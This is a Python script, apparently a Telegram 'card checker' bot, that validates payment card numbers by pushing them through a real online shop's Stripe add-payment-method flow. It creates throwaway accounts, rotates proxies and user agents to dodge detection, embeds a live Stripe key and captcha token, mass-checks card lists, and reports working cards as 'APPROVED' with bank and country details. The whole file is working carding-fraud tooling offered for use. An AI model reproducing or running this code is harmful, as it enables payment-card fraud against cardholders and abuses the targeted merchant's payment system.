import requests
import os
import re
import random
import string
import time
import json
from user_agent import generate_user_agent
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Headers for Stripe request
stripe_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

def get_rotating_user_agent():
    """Generate different types of user agents"""
    agents = [
        generate_user_agent(device_type='desktop'),
        generate_user_agent(device_type='desktop', os=('mac', 'linux')),
        generate_user_agent(device_type='desktop', os=('win',)),
        generate_user_agent(navigator='chrome'),
        generate_user_agent(navigator='firefox'),
    ]
    return random.choice(agents)

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def generate_random_email():
    """Generate random email for each account"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def parse_proxy(proxy_str):
    """Parse proxy string into components"""
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{ip}:{port}',
            'https': f'http://{username}:{password}@{ip}:{port}'
        }
    else:
        # If no auth, use without credentials
        ip, port = parts[0], parts[1]
        return {
            'http': f'http://{ip}:{port}',
            'https': f'http://{ip}:{port}'
        }

def load_proxies():
    """Load proxies from proxy.txt file"""
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def create_new_account(session, proxy_str):
    """Create a new account for each card with proxy"""
    try:
        proxies = parse_proxy(proxy_str)
        
        # Step 1: Get login nonce
        login_page_res = session.get('https://firstcornershop.com/my-account/', proxies=proxies, timeout=30)
        
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        if not login_nonce_match:
            return False, "Failed to get login nonce"
        login_nonce = login_nonce_match.group(1)

        # Step 2: Register a new account with random email ONLY
        random_email = generate_random_email()
        
        register_data = {
            'email': random_email, 
            'woocommerce-register-nonce': login_nonce,
            '_wp_http_referer': '/my-account/', 
            'register': 'Register',
        }
        
        reg_response = session.post('https://firstcornershop.com/my-account/', data=register_data, proxies=proxies, timeout=30, allow_redirects=False)
        
        # Check if registration was successful
        if reg_response.status_code in [302, 303]:
            return True, "Account created"
        else:
            return True, "Account might be created"
            
    except Exception as e:
        return False, f"Account error: {str(e)}"

def get_payment_nonce(session, proxy_str):
    """Get payment nonce from the payment method page with proxy"""
    try:
        proxies = parse_proxy(proxy_str)
        
        payment_page_res = session.get('https://firstcornershop.com/my-account/add-payment-method/', proxies=proxies, timeout=30)
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match:
            return None, "Failed to get payment nonce"
        
        ajax_nonce = payment_nonce_match.group(1)
        return ajax_nonce, "Success"
    except Exception as e:
        return None, f"Payment nonce error: {str(e)}"

def get_3ds_challenge_mandated(website_response, proxy_str):
    """Extract acsChallengeMandated value from 3DS authentication response - EXACT RESPONSE ONLY"""
    try:
        if not website_response.get('success'):
            return 'ACSFAILED'
            
        data_section = website_response.get('data', {})
        if data_section.get('status') != 'requires_action':
            return 'ACSFAILED'
            
        # Extract 3DS source directly from the website response
        next_action = data_section.get('next_action', {})
        if next_action.get('type') == 'use_stripe_sdk':
            use_stripe_sdk = next_action.get('use_stripe_sdk', {})
            three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
            
            if three_d_secure_2_source:
                proxies = parse_proxy(proxy_str)
                headers = stripe_headers.copy()
                headers['user-agent'] = get_rotating_user_agent()
                
                # Call 3DS authenticate endpoint
                auth_data = {
                    'source': three_d_secure_2_source,
                    'browser': '{"fingerprintAttempted":false,"fingerprintData":null,"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-GB","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-330","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"}',
                    'one_click_authn_device_support[hosted]': 'false',
                    'one_click_authn_device_support[same_origin_frame]': 'false',
                    'one_click_authn_device_support[spc_eligible]': 'true',
                    'one_click_authn_device_support[webauthn_eligible]': 'true',
                    'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
                    'key': 'pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO',
                    '_stripe_version': '2024-06-20'
                }
                
                auth_response = requests.post(
                    'https://api.stripe.com/v1/3ds2/authenticate',
                    headers=headers,
                    data=auth_data,
                    proxies=proxies,
                    timeout=30
                )
                
                if auth_response.status_code == 200:
                    auth_data_response = auth_response.json()
                    ares = auth_data_response.get('ares', {})
                    acs_challenge = ares.get('acsChallengeMandated')
                    
                    # Return exact value from response, no auto N
                    if acs_challenge in ['Y', 'N']:
                        return acs_challenge
                    else:
                        return 'ACSFAILED'
                else:
                    return 'ACSFAILED'
        
        return 'ACSFAILED'
        
    except Exception as e:
        return 'ACSFAILED'
        
def get_final_message(website_response, proxy_str):
    """Extract final user-friendly message from response with 3DS info"""
    try:
        if website_response.get('success'):
            data_section = website_response.get('data', {})
            status = data_section.get('status', '')
            
            if status == 'succeeded':
                return "Payment method successfully added."
            elif status == 'requires_action':
                # Get 3DS challenge mandated info directly from website response
                acs_challenge_mandated = get_3ds_challenge_mandated(website_response, proxy_str)
                return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}"
            else:
                return "Payment method status unknown."
        else:
            # Extract error message
            error_data = website_response.get('data', {})
            if 'error' in error_data:
                error_msg = error_data['error'].get('message', 'Declined')
                # Simplify common error messages
                if 'cvc' in error_msg.lower() or 'security code' in error_msg.lower():
                    return "Your card's security code is incorrect."
                elif 'declined' in error_msg.lower():
                    return "Your card was declined."
                elif 'insufficient' in error_msg.lower():
                    return "Your card has insufficient funds."
                elif 'expired' in error_msg.lower():
                    return "Your card has expired."
                else:
                    return error_msg
            else:
                return "Card declined."
    except:
        return "Unknown response"

# BIN lookup function - USING BINLIST.NET API
def get_bin_info(card_number):
    """Get BIN information using binlist.net API"""
    if not card_number or len(card_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }
    
    # Use first 6 digits (standard BIN length) - CLEAN THE CARD NUMBER
    clean_card = ''.join(filter(str.isdigit, card_number))
    bin_code = clean_card[:6]
    
    try:
        # Small delay for BIN API
        time.sleep(0.5)
        
        headers = {
            'User-Agent': get_rotating_user_agent(),
            'Accept': 'application/json'
        }
        
        # Using binlist.net API - more reliable
        api_url = f"https://lookup.binlist.net/{bin_code}"
        
        response = requests.get(api_url, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            
            # Parse binlist.net response format
            bank_name = data.get('bank', {}).get('name', 'Unavailable')
            country_name = data.get('country', {}).get('name', 'Unknown')
            brand = data.get('scheme', 'Unknown')
            card_type = data.get('type', 'Unknown')
            country_code = data.get('country', {}).get('alpha2', '')
            
            # For level, we'll use brand since binlist doesn't provide level
            level = brand
            
            return {
                'bank': bank_name if bank_name else 'Unavailable',
                'country': country_name if country_name else 'Unknown',
                'brand': brand if brand else 'Unknown',
                'type': card_type if card_type else 'Unknown',
                'level': level if level else 'Unknown',
                'emoji': get_country_emoji(country_code)
            }
        
        # If API call failed, return default values
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }
        
    except Exception:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }

def get_country_emoji(country_code):
    """Convert country code to emoji"""
    if not country_code or len(country_code) != 2:
        return '🏳️'
    
    try:
        # Convert to uppercase and get emoji
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return '🏳️'
        
def check_card_stripe(cc_line):
    """Main function to check card via Stripe (single card)"""
    start_time = time.time()
    
    try:
        # Parse CC
        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy
        
        # Load proxies
        proxies_list = load_proxies()
        if not proxies_list:
            return "❌ No proxies available"
        
        # Use random proxy
        proxy_str = random.choice(proxies_list)
        
        session = requests.Session()
        session.headers.update({
            'user-agent': get_rotating_user_agent()
        })

        if len(yy) == 4:
            yy_stripe = yy[-2:]
        else:
            yy_stripe = yy

        # Create a NEW account for this card
        account_created, account_msg = create_new_account(session, proxy_str)
        if not account_created:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Account creation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Get payment nonce
        ajax_nonce, nonce_msg = get_payment_nonce(session, proxy_str)
        if not ajax_nonce:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        # Prepare Stripe data with the current card
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2Fa28b4dac1e%3B+stripe-js-v3%2Fa28b4dac1e%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffirstcornershop.com&time_on_page=41633&client_attribution_metadata[client_session_id]=836082a4-1c37-4290-a02a-3f1dde89135c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=a41e2cfe-3af5-43d5-a562-0bc5fce1e766&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=8f53025c-03c7-44c5-9cbb-1a0b63ff30bfdd29b1&muid=47719103-3bce-4e07-95e9-d05596324525dd3f1f&sid=f2951355-ac05-40c7-ae5d-51ae69d2656c59555c&key=pk_live_51KnIwCBqVauev2abKoSjNWm78cR1kpbtEdrt8H322BjXRXUvjZK2R8iAQEfHPEV9XNOCLmYVADzYkLd96PccE9HN00s4zyYumQ&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYzNDM5OTIxLCJjZGF0YSI6Ik42NGpZQWtYUUdyVnlGT25YM0JWcmNxOGRkVlpIKzJxdnVCTHROVWk5MzBNZVZ1ano4NFlrY3JQaGh6UWRBejdZR3Bwa3JGVFFUdlFCajhlVmo2RDhqM3ExQXY1eElwdVdaVG5COFNGT0l2WkJxZnh3SUUzUXRnTEpoVWR1aHpCUmNuYytiTTRadytNTHg1NXJ1TUhnUm9IbUFKWEdObjhsM1BDdmREc3ZVd2krQ25wa1d6eUV6THU2bE9JUElETURuVCtJMUJYQlhBSGgzbVgiLCJwYXNza2V5IjoiR2NpS0tUeElDeWczbDNNU2ZrY0xUaXpnYUdFMkFiUk4yVURwNEVONWRwZEhiZEVZd1dnNWVML0NLREthQ3pjQlE4amtoSFhZR0hFbXNkSVlzUzhncGxJUkxKOHRmSmx5ODl6eTcwK3ZuWkxQVmdoQ3JUUlE1blhST3BCOEo3VitVUG5GdngvOTNneDBlcjVBKy96SzJIZUI5NTFObWJyZnNwaHZaRUdzcmZIWmw5WmZHdVYwckVRd3duNkVmUk9aWEw2WlZtR0hvcjRCL0N0QTJlTWVyWjd4ZTZjMnlPZ0ZoRllNNXBMQi9kRktQZWtVWFl2MUZYeEp1d21WNzFJK3Q5eThjU1FMb3VZZVpFSXZuZ3ZoM2xvNktLaWZDOERtenZSS2VxSkpGenY4N0ZJTFZpQ21scjdaZGhhWTcrdWozYmo2QzQ1QmN0eDlZd1dCN0ZMb29BMGNOUUo1TXQzZnVEVkU5SWw1REhrMmk3MGtJdFlVb1ZWcktQdlRwVGlPSUxoMi9NSmphOUlHZTdndHJKSlZiNm44QzI0T1B0ZmJuMG5QVWkrZFRlVTFiaXB4dDRoLzREV0xTckZDdVdPQWRySnlSZlhDRjNUUzJyZVl3aE8xMkVJYjNvNTRUQStaaTZaVC9obDQvMGhnalNvNHNwUEZ0dXNTWFplemRFTU5OOXZwMTBZVE5vLzNFTm5IUW05aDIxMitTUGNiSDh1S0xvODA4akFaalhiaFA3N1JVbDNKbW5HY2NYcVk3YjAzVWt4WUlLM0lXVFM4TkVuNDBva3UwTTFGSW1BUlByYTBuWS9UbEZXK2xSN25QY1F6VE5BeU5penlrbTVpckNmZGNCOVJDY0lZTVA3TUtMdUJLRGhxUWtFWWRDQWVBaDhkb0xJWW96b1RZdXFoRFJjZXRNUXE5dSsyN3FVVE51cDl6Q2ZLcDFGSlduRkRMM2tmbW1uWXZJZTNVY0wyR0ZUcVFlalIvSmJudllWRFR2alBxNnFBemlPTnNseG00bG80NmN2RHJHd2hCWEJqR2wyQjBxN215WVBXbytnMFhKa1FTQ0xiVlFpbG9zL3ZnZm5rZ3FFWVAyamNMbVV4Q0lUYWdrcVVyU3pBUTJmdGd2T2d2NXJOWjZWclFJWjRMdnRwbSt0RzNuUm1TdUlUNTBJY0hsVm02YitSNjIzdEo0ZzNrTzBuSk5FT1d5U3E3bGZvbm9MbDBET1Rpby9KNi90N3FHT0NRR05xdDlESldOWUxIdDFycDJTZDhCMS9IT1J1bmV4Vm1GcHRYSDE3c1JwdUd1S3FwSWQyK0RsOTBvMjAyc1JvQW9RbmlOL1N5YWdZck9TMGpaWkF6U3lHa2JLaElZdXpUU1QxaHdQU3h1elhQSUxYVzZkUmNUeHRGTk9qR1RJY2VpSzdINDZkRnlKTjBETm9VQlB0cU9uOURobkdkWEpRRzJQRHdMRmdGZTNmdHVFUkljd0JES0E0bnpnSmpLdzh0LzZLQldab3F1bWhnRUNiYkZITFppM2hMTHZRMzFuZ05lb3dYcm5BdFY5YVA2SkhQYXhZdGxBT0ZaOGY2YzMxZUpwVTgwSUpiYlN1eGc5RGNndFViVm05T3JIMmlKYU1xQnJrckMzZVJVNVpEalEyRE1JaVo2elBNaU16RHFBcm5EclU3RjdxYXV4ejdkNEFsTXVTbEJqWndaaCtBemxyZUhYQ1hDTjNNUVNuZzdjWVJXVTFPcVhoeHhHTjhqQlNxdDg4ajYyR0NHakJCSnJIdzM4MUthR2wzUjNBSUJzKzVSdHBJZFhXdlltTHQ4U3JtRGloSWtkbGZ0eUY3Y1JWcjRTa1BCeE1FNEHqOWs1VnJkeWxhQjRYR2txcnRLMU00UnRhdnRuZUVJbXFvWUxvSW5PVDVGekxUelYyR3k0RjB5R2RMYmFlR2Zwd2ZiTjFZZFRNVS9ET0lkQ2FyWlo5M29GRDJKR3ZYQks0ZFlyMUExNmlUZW04ODRMWUZtU2VIVFVReENONlZOVjUyS1ZCaHJLanUvZXlhRDZvVVhZYmN3SFlCZ3NZaGJEZHBRbHRpUlBFZHlSMzAzQ0tRK05FNGZNQ2NucmU3ZFUwMGFHcUZHemp5L2srR2VLck9JSXluSEZoQStUcWtRRTlNaU9rUGhTeHJEOXNEa2pidVkwWGsxYkxVMmgvbVpJb1UwYy91ZUxlM3JnQjVzSUdWTDl6dndSbXdZbTdGZG1GSGhzdlZhN1h1Q1FQVkxCQzM4V3c5MjRaMFJHNzhXbjdRWmVuZzM1ZlVHdmhZQlZMNi9GTkZLOVh4UkF2V08yTVNLRVJEM0VjcnJxbmtMb0p5WUhUaXlDMVhnekRVNmRTZnVSRWFZcFVxWjNTbVJCRWltVFdUSUpvOFBpM0srZERabTA3Q2RkeTd4dSttNVZQcFZ1Z3FjalFTYU1jbnZyL3J0THppVzNmR29mbFM2L2pvNFZSeU1SWHkycmZOS01IWEJiVllSRDNSQU1nbjJ4TjNkZ252b3BTeUc3Y1ZrdERqc3FKaGszNEg2L0FxTVcydENuc1FRcFR2UGFJamlwcHZ4a2llSzVKcWFwWDgxdkRFQmkrNFJ2NHlmNWJUQT09Iiwia3IiOiJhYjVhMTM4Iiwic2hhcmRfaWQiOjIant9191OX0.OJHabXwDS20gVBBjb-c6QtoBw3upH9H8xm0mpuek6mA'

        proxies = parse_proxy(proxy_str)
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, proxies=proxies, timeout=30)

        # Check if response has 'id' before extracting
        response_data = response.json()
        
        if 'id' in response_data:
            pm_id = response_data['id']
            
            # Second request (admin ajax)
            headers2 = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://firstcornershop.com',
                'priority': 'u=1, i',
                'referer': 'https://firstcornershop.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': get_rotating_user_agent(),
                'x-requested-with': 'XMLHttpRequest',
            }

            data2 = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }

            response2 = session.post('https://firstcornershop.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', headers=headers2, data=data2, proxies=proxies, timeout=30)
            website_response = response2.json()
            
            # Get final message with 3DS info
            final_message = get_final_message(website_response, proxy_str)
            
            elapsed_time = time.time() - start_time
            # Get BIN info using new binlist.net API
            bin_info = get_bin_info(n)
            
            # Check the actual status from the response
            if website_response.get('success'):
                data_section = website_response.get('data', {})
                status = data_section.get('status', '')
                
                if status == 'succeeded':
                    return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                elif status == 'requires_action':
                    return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                # Check for specific error messages that should be treated as APPROVED
                error_data = website_response.get('data', {})
                if 'error' in error_data:
                    error_msg = error_data['error'].get('message', '').lower()
                    
                    # Treat these errors as APPROVED
                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
                        return f"""
APPROVED CCN ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
        else:
            elapsed_time = time.time() - start_time
            # Get BIN info using new binlist.net API
            bin_info = get_bin_info(n)
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stripe validation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
🏛️𝗕𝗮𝗻𝗸: UNKNOWN
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_stripe(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = check_card_stripe(cc_line)
        results.append(result)
        time.sleep(2)  # Delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    # Test with a single card
    test_cc = "4111111111111111|12|2025|123"
    print("Testing Stripe checker...")
    result = check_card_stripe(test_cc)
    print(result)
